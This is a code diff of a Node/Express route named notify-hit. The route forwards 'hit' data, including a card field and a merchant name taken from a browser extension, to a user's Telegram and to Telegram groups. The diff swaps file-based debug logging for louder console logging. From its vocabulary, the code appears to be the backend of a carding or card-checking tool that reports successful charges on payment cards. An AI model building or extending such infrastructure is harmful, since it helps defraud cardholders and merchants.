@@ -199,19 +199,8 @@ router.post('/verify', verifyLimiter, async (req, res) => {
 
 // POST /api/tg/notify-hit - Send hit notification to user's Telegram (with optional screenshot)
 router.post('/notify-hit', async (req, res) => {
-  // IMMEDIATE FILE LOGGING - Create file as soon as endpoint is called
-  const fs = require('fs');
-  const path = require('path');
-  const logData = {
-    timestamp: new Date().toISOString(),
-    endpoint: '/api/tg/notify-hit',
-    body: req.body,
-    status: 'endpoint_called'
-  };
-  const logFile = path.join(__dirname, '..', 'notify_hit_called.json');
-  fs.writeFileSync(logFile, JSON.stringify(logData, null, 2));
-
-  console.log('[HIT_NOTIFICATION] Received hit notification request');
+  console.log('[HIT_NOTIFICATION] 🚨 ENDPOINT CALLED! 🚨');
+  console.log('[HIT_NOTIFICATION] Payload keys:', Object.keys(req.body || {}));
   if (!BOT_TOKEN) {
     console.warn('[HIT_NOTIFICATION] Bot token not configured - notifications will fail');
     // Don't reject, just log warning
@@ -374,41 +363,19 @@ router.post('/notify-hit', async (req, res) => {
     merchant: merchantName // Use extracted merchant name
   };
 
-  console.log('[HIT_NOTIFICATION] Constructed hitData:', JSON.stringify(hitData, null, 2));
-  console.log('[HIT_NOTIFICATION] Merchant name:', merchantName);
+    console.log('[HIT_NOTIFICATION] Constructed hitData:', JSON.stringify(hitData, null, 2));
+    console.log('[HIT_NOTIFICATION] Merchant name:', merchantName);
 
-  // Write debug info to file (with error handling)
-  try {
-    const debugInfo = {
-      timestamp: new Date().toISOString(),
-      hitData: hitData,
-      merchant: merchantName,
-      userMessageResult: 'pending',
-      current_url: current_url,
-      merchant_url: merchant_url
-    };
-    const debugFilePath = path.join(__dirname, '..', 'debug_hit_process.json');
-    fs.writeFileSync(debugFilePath, JSON.stringify(debugInfo, null, 2));
-    console.log('[HIT_NOTIFICATION] Debug file written successfully');
-  } catch (fileError) {
-    console.error('[HIT_NOTIFICATION] Failed to write debug file:', fileError.message);
-    // Continue execution even if file writing fails
-  }
-
-    console.log('[HIT_NOTIFICATION] 🎯 IMMEDIATELY BEFORE sendHitToGroups CALL...');
+    console.log('[HIT_NOTIFICATION] 🚨🚨🚨 IMMEDIATELY BEFORE sendHitToGroups CALL 🚨🚨🚨');
+    console.log('[HIT_NOTIFICATION] hitData prepared:', JSON.stringify(hitData, null, 2));
 
     try {
-      console.log('[HIT_NOTIFICATION] Calling sendHitToGroups with:', {
-        userId: hitData.userId,
-        merchant: hitData.merchant,
-        card: hitData.card
-      });
-
+      console.log('[HIT_NOTIFICATION] 📞 CALLING sendHitToGroups NOW...');
       // For extension hits, we don't have a checkout URL, so pass a generic one
       await sendHitToGroups(hitData, 'https://extension-hit.com');
-      console.log('[HIT_NOTIFICATION] ✅ sendHitToGroups completed successfully');
+      console.log('[HIT_NOTIFICATION] ✅✅✅ sendHitToGroups FINISHED SUCCESSFULLY ✅✅✅');
     } catch (groupError) {
-      console.error('[HIT_NOTIFICATION] ❌ CRITICAL: sendHitToGroups threw exception:');
+      console.error('[HIT_NOTIFICATION] ❌❌❌ sendHitToGroups CRASHED ❌❌❌');
       console.error('[HIT_NOTIFICATION] Error:', groupError.message);
       console.error('[HIT_NOTIFICATION] Stack:', groupError.stack);
     }
